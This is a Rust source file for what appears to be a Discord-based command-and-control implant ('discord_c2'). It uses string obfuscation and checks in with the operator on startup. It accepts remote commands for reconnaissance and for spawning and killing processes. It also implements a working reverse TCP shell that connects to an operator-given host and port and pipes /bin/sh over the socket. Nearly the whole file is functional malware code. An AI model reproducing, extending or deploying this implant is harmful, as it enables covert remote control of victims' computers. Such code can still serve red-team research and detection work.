use std::{net::IpAddr, process::Stdio, sync::Arc};

use commands::{process, recon, utils};
use config::AgentConfig;
use constants::RUSCORD_GUILD_ID;
use poise::{
	serenity_prelude::{self as serenity, futures::StreamExt},
	FrameworkError,
};
use tokio::{
	io::{AsyncReadExt, AsyncWriteExt},
	net::TcpStream,
	process::Command,
	sync::Mutex,
};
use tokio_util::codec::{FramedRead, LinesCodec};
use tracing::{info, warn};
use tracing_subscriber::EnvFilter;
mod commands;
mod config;
mod os;
pub const MAX_DISCORD_CHARS: usize = 2000;

#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

pub mod constants {
	include!(concat!(env!("OUT_DIR"), "/constants.rs"));
}

#[derive(Debug)]
pub struct Data {
	pub config: Mutex<AgentConfig>,
	pub initialization_time: tokio::time::Instant,
	pub os_module: crate::os::OsModule,
}

pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
pub type RuscordContext<'a> = poise::Context<'a, Data, RuscordError>;

/// Initializes a reverse TCP shell to the given LHOST and LPORT.
#[poise::command(prefix_command)]
async fn shell(
	ctx: RuscordContext<'_>, #[description = "LHOST"] listening_ip: IpAddr,
	#[description = "LPORT"] listening_port: u16,
) -> Result<(), RuscordError> {
	match TcpStream::connect((listening_ip, listening_port)).await {
		Ok(stream) => {
			reply!(ctx, "Successfully connected to {}:{}", listening_ip, listening_port);
			let mut cmd = Command::new("/bin/sh")
				.stderr(Stdio::piped())
				.stdin(Stdio::piped())
				.stdout(Stdio::piped())
				.spawn()?;

			let (tcp_read, tcp_write) = stream.into_split();
			let (tcp_read, tcp_write) = (Arc::new(Mutex::new(tcp_read)), Arc::new(Mutex::new(tcp_write)));

			// Handle stdout
			if let Some(stdout) = cmd.stdout.take() {
				let mut reader = FramedRead::new(stdout, LinesCodec::new());
				tokio::spawn({
					let cloned_write = tcp_write.clone();
					async move {
						while let Some(Ok(line)) = reader.next().await {
							let mut guard = cloned_write.lock().await;
							guard.write_all(line.as_bytes()).await.unwrap();
							guard.write_all(&[b'\n']).await.unwrap();
							guard.flush().await.unwrap();
						}
					}
				});
			}

			// Handle stderr
			if let Some(stderr) = cmd.stderr.take() {
				let mut reader = FramedRead::new(stderr, LinesCodec::new());
				tokio::spawn(async move {
					while let Some(Ok(line)) = reader.next().await {
						let mut guard = tcp_write.lock().await;
						guard.write_all(line.as_bytes()).await.unwrap();
						guard.write_all(&[b'\n']).await.unwrap();
						guard.flush().await.unwrap();
					}
				});
			}

			// Handle stdin
			if let Some(mut stdin) = cmd.stdin.take() {
				let mut reader = [0; 8024 * 2];
				tokio::spawn(async move {
					while let Ok(n) = tcp_read.lock().await.read(&mut reader).await {
						if n == 0 {
							break;
						}
						stdin.write_all(&reader[..n]).await.unwrap();
						stdin.flush().await.unwrap();
					}
				});
			}
		},
		Err(error) => {
			reply!(
				ctx,
				"Failed to connect to listener at `{}:{}`: \n> \"{}\"",
				listening_ip,
				listening_port,
				error
			);
		},
	}

	Ok(())
}

#[tokio::main]
async fn main() {
	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
	tracing_subscriber::fmt()
		.with_env_filter(EnvFilter::from_default_env())
		.init();
	let token = std::env::var("DISCORD_TOKEN").expect("missing DISCORD_TOKEN");
	let intents = serenity::GatewayIntents::all();

	let framework = poise::Framework::builder()
		.options(poise::FrameworkOptions {
			prefix_options: poise::PrefixFrameworkOptions {
				prefix: Some("!".into()),
				..Default::default()
			},
			commands: vec![
				utils::clear(),
				utils::help(),
				recon::agent_info(),
				recon::processes(),
				process::spawn(),
				process::kill(),
			],
			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
			on_error: |error| {
				Box::pin(async move {
					match error {
						FrameworkError::Command { error, ctx, .. } => {
							reply!(ctx, "{error}");
						},
						other => poise::builtins::on_error(other).await.unwrap(),
					}
				})
			},
			command_check: Some(|ctx| {
				Box::pin(async move {
					if ctx.channel_id() != ctx.data().config.lock().await.command_channel {
						return Ok(false);
					}
					Ok(true)
				})
			}),
			..Default::default()
		})
		.setup(|ctx, _ready, framework| {
			Box::pin(async move {
				let agent_config = AgentConfig::load_config(ctx).await?;
				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
				Ok(Data {
					config: Mutex::new(agent_config),
					initialization_time: tokio::time::Instant::now(),
					os_module: crate::os::OsModule::default(),
				})
			})
		})
		.build();

	let mut client = serenity::ClientBuilder::new(token, intents)
		.framework(framework)
		.await
		.unwrap();
	client.start().await.unwrap();
}

async fn event_handler(
	ctx: &serenity::Context, event: &serenity::FullEvent, _framework: poise::FrameworkContext<'_, Data, RuscordError>,
	data: &Data,
) -> Result<(), RuscordError> {
	match event {
		serenity::FullEvent::Ready { data_about_bot } => {
			info!("logged in as {}", data_about_bot.user.name);
			let channel_id = data.config.lock().await.command_channel;
			channel_id.say(&ctx.http, "@everyone agent check in").await?;
		},
		serenity::FullEvent::Message { .. } => {},
		serenity::FullEvent::Ratelimit { data } => {
			warn!("ratelimited: {:?}", data);
		},
		_ => {},
	}
	Ok(())
}
